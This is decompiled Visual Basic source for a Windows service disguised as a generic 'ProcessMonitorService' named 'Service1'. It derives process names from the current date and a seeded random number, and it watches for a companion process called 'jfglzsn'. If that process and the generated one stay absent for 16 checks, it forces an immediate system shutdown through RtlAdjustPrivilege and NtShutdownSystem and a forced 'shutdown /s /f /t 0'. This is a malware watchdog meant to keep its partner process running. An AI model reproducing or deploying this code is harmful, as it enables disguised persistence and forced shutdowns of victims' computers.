Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Linq
Imports System.Runtime.InteropServices
Imports System.ServiceProcess
Imports System.Timers
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace zmserv
	' Token: 0x0200000A RID: 10
	<DesignerGenerated()>
	Public Class ProcessMonitorService
		Inherits ServiceBase

		' Token: 0x06000016 RID: 22 RVA: 0x000022D7 File Offset: 0x000004D7
		Public Sub New()
			Me._GlobalMock = "C:\windows\jf"
			Me.AddClass()
		End Sub

		' Token: 0x06000017 RID: 23
		Private Declare Function RtlAdjustPrivilege Lib "ntdll.dll" (int_0 As Integer, int_1 As Integer, int_2 As Integer, ByRef int_3 As Integer) As Integer

		' Token: 0x06000018 RID: 24
		Private Declare Function NtShutdownSystem Lib "ntdll.dll" (int_0 As Integer) As Integer

		' Token: 0x06000019 RID: 25 RVA: 0x000024F4 File Offset: 0x000006F4
		Protected Overrides Sub OnStart(args As String())
			' The following expression was wrapped in a checked-statement
			Dim num As Integer = DateAndTime.Month(DateAndTime.Now) * DateAndTime.Day(DateAndTime.Now)
			Dim num2 As Integer = num Mod 7
			Dim num3 As Integer = num Mod 9
			Dim num4 As Integer = num Mod 5
			Dim num5 As Integer = num Mod 3
			Dim text As String
			If num Mod 2 = 0 Then
				text = Conversions.ToString(Strings.Chr(97 + num2)) + Conversions.ToString(Strings.Chr(98 + num3)) + Conversions.ToString(Strings.Chr(101 + num4)) + Conversions.ToString(Strings.Chr(99 + num5))
			Else
				text = Conversions.ToString(Strings.Chr(97 + num3)) + Conversions.ToString(Strings.Chr(98 + num2)) + Conversions.ToString(Strings.Chr(101 + num5)) + Conversions.ToString(Strings.Chr(99 + num4))
			End If
			Me.m_UtilsMock = text
			Me.m_ProcessMock = text + ".exe"
			VBMath.Randomize(CDbl(num))
			Dim num6 As Long = CLng(Math.Round(CDbl(VBMath.Rnd()) * 100000.0 * 3.0 + 1.0))
			Dim text2 As String = ""
			Dim num7 As Integer = 1
			Do
				text2 = Conversions.ToString(Strings.Chr(CInt((num6 Mod 10L + 105L)))) + text2
				num6 /= 10L
				num7 += 1
			Loop While num7 <= 5
			Me.m_UtilsMock = text2
			Me.m_ProcessMock = text2 + ".exe"
			Me._SetterMock = 0L
			Me.m_TestsMock = New Timer(30000.0)
			Me.m_TestsMock.AutoReset = True
			AddHandler Me.m_TestsMock.Elapsed, AddressOf Me.RegisterClass
			Me.m_TestsMock.Start()
		End Sub

		' Token: 0x0600001A RID: 26 RVA: 0x000026B0 File Offset: 0x000008B0
		Private Sub RegisterClass(sender As Object, e As ElapsedEventArgs)
			If Enumerable.Any(Of Process)(Process.GetProcessesByName("jfglzsn")) Then
				Me.readerMock = New Timer(5000.0)
				Me.readerMock.AutoReset = True
				AddHandler Me.readerMock.Elapsed, AddressOf Me.CallClass
				Me.readerMock.Start()
				Me.m_TestsMock.Dispose()
				Me.m_TestsMock = Nothing
			End If
		End Sub

		' Token: 0x0600001B RID: 27 RVA: 0x00002724 File Offset: 0x00000924
		Private Sub CallClass(sender As Object, e As ElapsedEventArgs)
			If Not Enumerable.Any(Of Process)(Process.GetProcessesByName(Me.m_UtilsMock)) AndAlso Not Enumerable.Any(Of Process)(Process.GetProcessesByName("jfglzsn")) Then
				Dim ptr As Long = Me._SetterMock
				Me._SetterMock = ptr + 1L
				If Me._SetterMock >= 16L Then
					ProcessMonitorService.ForceShutdown()
					Process.Start("shutdown", "/s /f /t 0")
					Return
				End If
			Else
				Me._SetterMock = 0L
			End If
		End Sub

		' Token: 0x0600001C RID: 28 RVA: 0x000022F0 File Offset: 0x000004F0
		Protected Overrides Sub OnStop()
			If Me.readerMock IsNot Nothing Then
				Me.readerMock.[Stop]()
				Me.readerMock.Dispose()
			End If
			If Me.m_TestsMock IsNot Nothing Then
				Me.m_TestsMock.[Stop]()
				Me.m_TestsMock.Dispose()
			End If
		End Sub

		' Token: 0x0600001D RID: 29 RVA: 0x000027A4 File Offset: 0x000009A4
		Public Shared Sub ForceShutdown()
			Dim num As Integer = 0
			ProcessMonitorService.RtlAdjustPrivilege(19, 1, 0, num)
			ProcessMonitorService.NtShutdownSystem(2)
		End Sub

		' Token: 0x0600001E RID: 30 RVA: 0x000027C8 File Offset: 0x000009C8
		Public Shared Sub ForceRestart()
			Dim num As Integer = 0
			ProcessMonitorService.RtlAdjustPrivilege(19, 1, 0, num)
			ProcessMonitorService.NtShutdownSystem(1)
		End Sub

		' Token: 0x0600001F RID: 31 RVA: 0x000027EC File Offset: 0x000009EC
		<DebuggerNonUserCode()>
		Protected Overrides Sub Dispose(disposing As Boolean)
			Try
				If disposing AndAlso Me.m_InterpreterMock IsNot Nothing Then
					Me.m_InterpreterMock.Dispose()
				End If
			Finally
				MyBase.Dispose(disposing)
			End Try
		End Sub

		' Token: 0x06000020 RID: 32 RVA: 0x0000232E File Offset: 0x0000052E
		<DebuggerNonUserCode()>
		<MTAThread()>
		Public Shared Sub Main()
			ServiceBase.Run(New ServiceBase() { New ProcessMonitorService() })
		End Sub

		' Token: 0x06000021 RID: 33 RVA: 0x00002343 File Offset: 0x00000543
		<DebuggerStepThrough()>
		Private Sub AddClass()
			Me.m_InterpreterMock = New Container()
			MyBase.ServiceName = "Service1"
		End Sub

		' Token: 0x04000009 RID: 9
		Private readerMock As Timer

		' Token: 0x0400000A RID: 10
		Private m_TestsMock As Timer

		' Token: 0x0400000B RID: 11
		Private Const orderMock As Integer = 5000

		' Token: 0x0400000C RID: 12
		Private Const _FacadeMock As Integer = 30000

		' Token: 0x0400000D RID: 13
		Private _SetterMock As Long

		' Token: 0x0400000E RID: 14
		Private m_UtilsMock As String

		' Token: 0x0400000F RID: 15
		Private m_ProcessMock As String

		' Token: 0x04000010 RID: 16
		Private Const refMock As Integer = 19

		' Token: 0x04000011 RID: 17
		Private Const m_MessageMock As Integer = 0

		' Token: 0x04000012 RID: 18
		Private Const _ContainerMock As Integer = 1

		' Token: 0x04000013 RID: 19
		Private Const rulesMock As Integer = 2

		' Token: 0x04000014 RID: 20
		Private _GlobalMock As String

		' Token: 0x04000015 RID: 21
		Private m_InterpreterMock As IContainer
	End Class
End Namespace
